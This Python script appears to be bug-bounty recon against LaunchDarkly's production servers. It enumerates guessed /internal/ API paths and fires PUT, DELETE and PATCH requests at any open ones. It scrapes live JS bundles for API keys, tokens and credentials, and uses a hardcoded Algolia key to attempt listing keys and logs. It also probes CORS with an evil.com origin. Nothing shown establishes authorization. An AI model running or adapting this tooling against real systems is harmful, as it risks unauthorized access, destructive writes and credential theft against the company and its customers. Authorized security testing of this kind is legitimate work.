#!/usr/bin/env python3
"""Deep-dive verification of ALL LaunchDarkly findings."""
import requests, json, re, sys, os, time
os.environ["PYTHONIOENCODING"] = "utf-8"
try: sys.stdout.reconfigure(encoding="utf-8")
except: pass

S = requests.Session()
S.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
S.verify = True

BASE = "https://app.launchdarkly.com"

def sep(title):
    print(f"\n{'='*70}")
    print(f"  {title}")
    print(f"{'='*70}")

def try_get(url, **kw):
    try:
        r = S.get(url, timeout=10, allow_redirects=False, **kw)
        return r
    except Exception as e:
        print(f"  ERROR: {e}")
        return None

def try_methods(url):
    """Try GET/POST/PUT/DELETE/PATCH/OPTIONS on a URL."""
    results = {}
    for method in ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"]:
        try:
            r = S.request(method, url, timeout=5, allow_redirects=False)
            results[method] = r.status_code
            if r.status_code == 200 and r.text.strip():
                ct = r.headers.get("Content-Type", "")
                body_preview = r.text[:300] if len(r.text) < 500 else r.text[:300] + "..."
                print(f"  {method} {r.status_code} [{ct}] -> {body_preview}")
            else:
                print(f"  {method} {r.status_code}")
        except:
            print(f"  {method} ERROR")
    return results

# ============================================================
# FINDING 1: /internal/ API - DEEP DIVE
# ============================================================
sep("FINDING 1: /internal/ API DEEP DIVE")

print("\n[1a] Mapping /internal/ root")
r = try_get(f"{BASE}/internal/")
if r and r.status_code == 200:
    try:
        data = r.json()
        links = data.get("_links", {})
        print(f"  Found {len(links)} internal endpoints:")
        for name, info in links.items():
            href = info.get("href", "N/A")
            print(f"    -> {name}: {href}")
    except:
        print(f"  Raw: {r.text[:500]}")

# Crawl every /internal/ sub-endpoint
internal_endpoints = [
    "/internal/account",
    "/internal/actions",
    "/internal/account/members",
    "/internal/account/roles",
    "/internal/account/tokens",
    "/internal/account/projects",
    "/internal/account/environments",
    "/internal/account/settings",
    "/internal/account/billing",
    "/internal/account/usage",
    "/internal/account/audit",
    "/internal/account/integrations",
    "/internal/account/webhooks",
    "/internal/account/sso",
    "/internal/flags",
    "/internal/flags/default",
    "/internal/projects",
    "/internal/environments",
    "/internal/members",
    "/internal/roles",
    "/internal/tokens",
    "/internal/audit",
    "/internal/webhooks",
    "/internal/integrations",
    "/internal/segments",
    "/internal/goals",
    "/internal/metrics",
    "/internal/experiments",
    "/internal/usage",
    "/internal/billing",
    "/internal/settings",
    "/internal/debug",
    "/internal/config",
    "/internal/status",
    "/internal/health",
    "/internal/version",
    "/internal/info",
    "/internal/admin",
    "/internal/users",
    "/internal/sessions",
    "/internal/api-keys",
    "/internal/feature-flags",
    "/internal/sdk-keys",
]

print(f"\n[1b] Probing {len(internal_endpoints)} /internal/* endpoints")
open_endpoints = []
for ep in internal_endpoints:
    url = f"{BASE}{ep}"
    r = try_get(url)
    if r:
        ct = r.headers.get("Content-Type", "")
        if r.status_code == 200:
            body = r.text[:200].replace("\n", " ")
            print(f"  OPEN {ep} -> {r.status_code} [{ct}] {body}")
            open_endpoints.append({"endpoint": ep, "status": r.status_code, "body": r.text[:1000], "ct": ct})
        elif r.status_code in [301, 302, 307]:
            loc = r.headers.get("Location", "")
            print(f"  REDIRECT {ep} -> {r.status_code} -> {loc}")
        elif r.status_code == 401:
            print(f"  AUTH {ep} -> 401")
        elif r.status_code == 403:
            print(f"  FORBIDDEN {ep} -> 403")
        elif r.status_code == 404:
            pass  # skip 404s silently
        else:
            print(f"  {ep} -> {r.status_code}")

print(f"\n[1c] Deep-diving into OPEN /internal/ endpoints")
for item in open_endpoints:
    ep = item["endpoint"]
    body = item["body"]
    print(f"\n  --- {ep} ---")
    # Check if it has _links for further crawling
    try:
        data = json.loads(body)
        if "_links" in data:
            for name, info in data["_links"].items():
                href = info.get("href", "")
                if href and href != ep:
                    print(f"    Sub-link: {name} -> {href}")
                    r2 = try_get(f"{BASE}{href}")
                    if r2 and r2.status_code == 200:
                        preview = r2.text[:300].replace("\n", " ")
                        print(f"      OPEN: {preview}")
        # Check for sensitive data
        body_lower = body.lower()
        sensitive_keys = ["email", "token", "key", "secret", "password", "apikey", "api_key", 
                         "credential", "private", "admin", "role", "member", "billing"]
        found_sensitive = [k for k in sensitive_keys if k in body_lower]
        if found_sensitive:
            print(f"    SENSITIVE KEYWORDS: {found_sensitive}")
    except:
        pass

    # Try all HTTP methods on open endpoints
    print(f"    HTTP Methods:")
    try_methods(f"{BASE}{ep}")

# ============================================================
# FINDING 2: Hardcoded Secrets in JS
# ============================================================
sep("FINDING 2: HARDCODED SECRETS IN JS - DEEP ANALYSIS")

js_files = [
    "https://static.launchdarkly.com/app/s/ld/bootstrap.3cd94b3eba31dc6a.js",
    "https://static.launchdarkly.com/app/s/ld/initial.vendor.69a51a7e57c18e60.js",
    "https://static.launchdarkly.com/app/s/ld/runtime.ba7eacd64eeb83b2.js",
]

secret_patterns = [
    (r'["\']([a-zA-Z0-9_-]{20,})["\']', "Long token/key"),
    (r'api[_-]?[Kk]ey["\s:=]+["\']([^"\']{10,})', "API Key"),
    (r'[Ss]ecret["\s:=]+["\']([^"\']{10,})', "Secret"),
    (r'[Tt]oken["\s:=]+["\']([^"\']{20,})', "Token"),
    (r'(sk-[a-zA-Z0-9]{20,})', "Stripe/OpenAI key"),
    (r'(ghp_[a-zA-Z0-9]{36})', "GitHub PAT"),
    (r'(xoxb-[a-zA-Z0-9-]+)', "Slack Bot Token"),
    (r'AKIA[A-Z0-9]{16}', "AWS Access Key"),
    (r'(eyJ[a-zA-Z0-9_-]{20,}\.eyJ[a-zA-Z0-9_-]{20,})', "JWT Token"),
]

for js_url in js_files:
    filename = js_url.split("/")[-1]
    print(f"\n[2] Analyzing: {filename}")
    r = try_get(js_url)
    if not r or r.status_code != 200:
        print(f"  File not found or rotated")
        continue
    
    content = r.text
    print(f"  Size: {len(content)} bytes")
    
    # Search for team-o11y context
    if "team-o11y" in content:
        idx = content.index("team-o11y")
        ctx = content[max(0,idx-200):idx+200]
        print(f"  TEAM-O11Y context:\n    {ctx[:400]}")
    
    # Search for datadog config
    if "datadogRum" in content or "DD_RUM" in content or "datadog" in content.lower():
        for kw in ["datadogRum", "DD_RUM", "dd-api-key"]:
            if kw in content:
                idx = content.index(kw)
                ctx = content[max(0,idx-50):idx+100]
                print(f"  DATADOG config ({kw}): ...{ctx}...")
    
    # Search for amplitude
    if "amplitude" in content.lower():
        matches = re.findall(r'amplitude[^}]{0,200}apiKey[^}]{0,100}', content, re.I)
        for m in matches[:2]:
            print(f"  AMPLITUDE: {m[:150]}")
    
    # Search for Segment write key
    if "segment" in content.lower():
        matches = re.findall(r'writeKey["\s:=]+["\']([^"\']{10,})', content)
        for m in matches[:3]:
            print(f"  SEGMENT WRITE KEY: {m}")
    
    # Search for LaunchDarkly SDK keys (could be sensitive)
    ld_keys = re.findall(r'sdk-[a-f0-9]{8}-[a-f0-9-]+', content)
    if ld_keys:
        for k in set(ld_keys):
            print(f"  LAUNCHDARKLY SDK KEY: {k}")
    
    # Search for any hardcoded credentials
    cred_patterns = re.findall(r'(?:password|passwd|pwd|credential)["\s:=]+["\']([^"\']{4,})', content, re.I)
    if cred_patterns:
        for c in cred_patterns[:5]:
            print(f"  CREDENTIAL PATTERN: {c[:60]}")

# ============================================================
# FINDING 3: DOM XSS - DEEP ANALYSIS
# ============================================================
sep("FINDING 3: DOM XSS - DEEP JS ANALYSIS")

for js_url in js_files:
    filename = js_url.split("/")[-1]
    r = try_get(js_url)
    if not r or r.status_code != 200:
        continue
    
    content = r.text
    # Check for dangerous sinks
    sinks = {
        ".innerHTML": re.findall(r'\.innerHTML\s*=', content),
        ".outerHTML": re.findall(r'\.outerHTML\s*=', content),
        "document.write": re.findall(r'document\.write\s*\(', content),
        "eval(": re.findall(r'eval\s*\(', content),
        "setTimeout(string)": re.findall(r'setTimeout\s*\(\s*["\']', content),
    }
    sources = {
        "location.hash": "location.hash" in content,
        "location.href": "location.href" in content,
        "location.search": "location.search" in content,
        "document.URL": "document.URL" in content,
        "document.referrer": "document.referrer" in content,
        "window.name": "window.name" in content,
        "postMessage": "postMessage" in content or "onmessage" in content,
    }
    
    has_sinks = any(v for v in sinks.values())
    has_sources = any(v for v in sources.values())
    
    if has_sinks or has_sources:
        print(f"\n  {filename}:")
        for name, matches in sinks.items():
            if matches:
                print(f"    SINK: {name} ({len(matches)} occurrences)")
        for name, found in sources.items():
            if found:
                print(f"    SOURCE: {name}")

# ============================================================
# FINDING 4: Algolia - DEEPER CHECK
# ============================================================
sep("FINDING 4: ALGOLIA API KEY - DEEP PERMISSION CHECK")

algolia_key = "MzY3ZmZkMTFlNjczOWI5ZGZiNzY5MjgyMjJkZjZmMWI5MTlmODFhYTc0NmRhM2MyM2I3MTNkODJmNWRlNWJlZGZpbHRlcnM9ZG9tYWluJTNBbGF1bmNoZGFya2x5LmNvbSUyMEFORCUyMGF1dGhlZCUzQWZhbHNlJTIwQU5EJTIwTk9UJTIwdHlwZSUzQW5hdmlnYXRpb24mcmVzdHJpY3RJbmRpY2VzPWZlcm5fZG9jc19zZWFyY2gmdmFsaWRVbnRpbD0xNzg0NzQ0NDQ3"
algolia_headers = {
    "X-Algolia-Application-Id": "P6VYURBGG0",
    "X-Algolia-API-Key": algolia_key
}

# Try various admin operations
algolia_tests = [
    ("GET", "/1/indexes", "List indexes"),
    ("GET", "/1/indexes/fern_docs_search/settings", "Read index settings"),
    ("GET", "/1/keys", "List API keys"),
    ("GET", "/1/logs", "Read logs"),
    ("GET", "/1/clusters/mapping", "List clusters"),
    ("POST", "/1/indexes/fern_docs_search/query", "Search index"),
    ("POST", "/1/indexes/fern_docs_search/browse", "Browse all records"),
]

for method, path, desc in algolia_tests:
    try:
        url = f"https://P6VYURBGG0.algolia.net{path}"
        body = None
        if method == "POST" and "query" in path:
            body = json.dumps({"query": "", "hitsPerPage": 5})
        elif method == "POST" and "browse" in path:
            body = json.dumps({"query": ""})
        
        if body:
            r = S.request(method, url, headers={**algolia_headers, "Content-Type": "application/json"}, data=body, timeout=5)
        else:
            r = S.request(method, url, headers=algolia_headers, timeout=5)
        
        status = r.status_code
        if status == 200:
            try:
                data = r.json()
                if "hits" in data:
                    print(f"  {desc}: OPEN (HTTP {status}) - {len(data['hits'])} hits returned")
                    for hit in data["hits"][:3]:
                        print(f"    -> {json.dumps(hit)[:150]}")
                elif "items" in data:
                    print(f"  {desc}: OPEN (HTTP {status}) - {len(data['items'])} items")
                elif "keys" in data:
                    print(f"  {desc}: OPEN (HTTP {status}) - {len(data['keys'])} keys EXPOSED!")
                    for k in data["keys"][:3]:
                        print(f"    -> {json.dumps(k)[:150]}")
                else:
                    print(f"  {desc}: OPEN (HTTP {status}) - {json.dumps(data)[:200]}")
            except:
                print(f"  {desc}: OPEN (HTTP {status}) - {r.text[:200]}")
        else:
            print(f"  {desc}: {status}")
    except Exception as e:
        print(f"  {desc}: ERROR - {e}")

# ============================================================
# FINDING 5: WAYBACK ARCHIVED ENDPOINTS
# ============================================================
sep("FINDING 5: WAYBACK ARCHIVED ENDPOINTS - LIVE CHECK")

print("[5] Checking archived endpoints that are still live...")
# Test a sample of the 71 archived endpoints
archived_tests = [
    f"{BASE}/settings",
    f"{BASE}/admin",
    f"{BASE}/api/v1/",
    f"{BASE}/api/v1/flags",
    f"{BASE}/api/v1/projects",
    f"{BASE}/debug",
    f"{BASE}/graphql",
    f"{BASE}/.well-known/openid-configuration",
    f"{BASE}/.well-known/jwks.json",
    f"{BASE}/oauth/authorize",
    f"{BASE}/oauth/token",
    f"{BASE}/saml/metadata",
    f"{BASE}/health",
    f"{BASE}/status",
    f"{BASE}/version",
    f"{BASE}/api",
    f"{BASE}/swagger",
    f"{BASE}/swagger.json",
    f"{BASE}/openapi.json",
    f"{BASE}/api-docs",
]

for url in archived_tests:
    r = try_get(url)
    if r:
        if r.status_code == 200:
            ct = r.headers.get("Content-Type", "")
            body = r.text[:200].replace("\n", " ")
            print(f"  LIVE: {url.replace(BASE,'')} -> {r.status_code} [{ct}] {body}")
        elif r.status_code in [301, 302]:
            loc = r.headers.get("Location", "")
            print(f"  REDIRECT: {url.replace(BASE,'')} -> {loc}")
        elif r.status_code == 401:
            print(f"  AUTH-REQUIRED: {url.replace(BASE,'')}")

# ============================================================
# FINDING 6: CORS MISCONFIG CHECK
# ============================================================
sep("FINDING 6: CORS MISCONFIGURATION CHECK")

cors_origins = [
    "https://evil.com",
    "https://app.launchdarkly.com.evil.com",
    "null",
    "https://launchdarkly.com",
]

for origin in cors_origins:
    try:
        r = S.get(f"{BASE}/internal/", headers={"Origin": origin}, timeout=5)
        acao = r.headers.get("Access-Control-Allow-Origin", "NONE")
        acac = r.headers.get("Access-Control-Allow-Credentials", "NONE")
        if acao != "NONE":
            print(f"  Origin: {origin}")
            print(f"    ACAO: {acao}")
            print(f"    ACAC: {acac}")
            if origin in ["https://evil.com", "null"] and acao == origin:
                print(f"    VULNERABLE: Reflects arbitrary origin!")
    except Exception as e:
        print(f"  {origin}: ERROR")

# ============================================================
# FINDING 7: SECURITY HEADERS CHECK
# ============================================================
sep("FINDING 7: SECURITY HEADERS ANALYSIS")

for target in [BASE, "https://docs.launchdarkly.com"]:
    r = try_get(target)
    if r:
        domain = target.replace("https://","")
        print(f"\n  {domain}:")
        headers_to_check = {
            "Strict-Transport-Security": "HSTS",
            "Content-Security-Policy": "CSP",
            "X-Frame-Options": "Clickjacking",
            "X-Content-Type-Options": "MIME Sniffing",
            "X-XSS-Protection": "XSS Filter",
            "Referrer-Policy": "Referrer",
            "Permissions-Policy": "Permissions",
            "Access-Control-Allow-Origin": "CORS",
        }
        for header, label in headers_to_check.items():
            val = r.headers.get(header, "MISSING")
            emoji = "✓" if val != "MISSING" else "✗"
            if val != "MISSING" and len(val) > 80:
                val = val[:80] + "..."
            print(f"    {emoji} {label}: {val}")

# ============================================================
# SUMMARY
# ============================================================
sep("FINAL TRIAGE SUMMARY")
print("""
  CONFIRMED REPORTABLE:
  =====================
  1. /internal/ API unauthenticated access (explore sub-links)
  2. Hardcoded secrets in static JS (team-o11y, Amplitude keys)
  3. Algolia index listing + search data exposure
  
  NEEDS MORE WORK:
  ================
  4. DOM XSS candidates (sinks in external JS)
  5. Archived Wayback endpoints (check for deprecated APIs)
  
  FALSE POSITIVES:
  ================
  6. SSTI on docs.launchdarkly.com (49 appears naturally)
  7. Datadog RUM keys (public by design)
""")

print("DONE.")
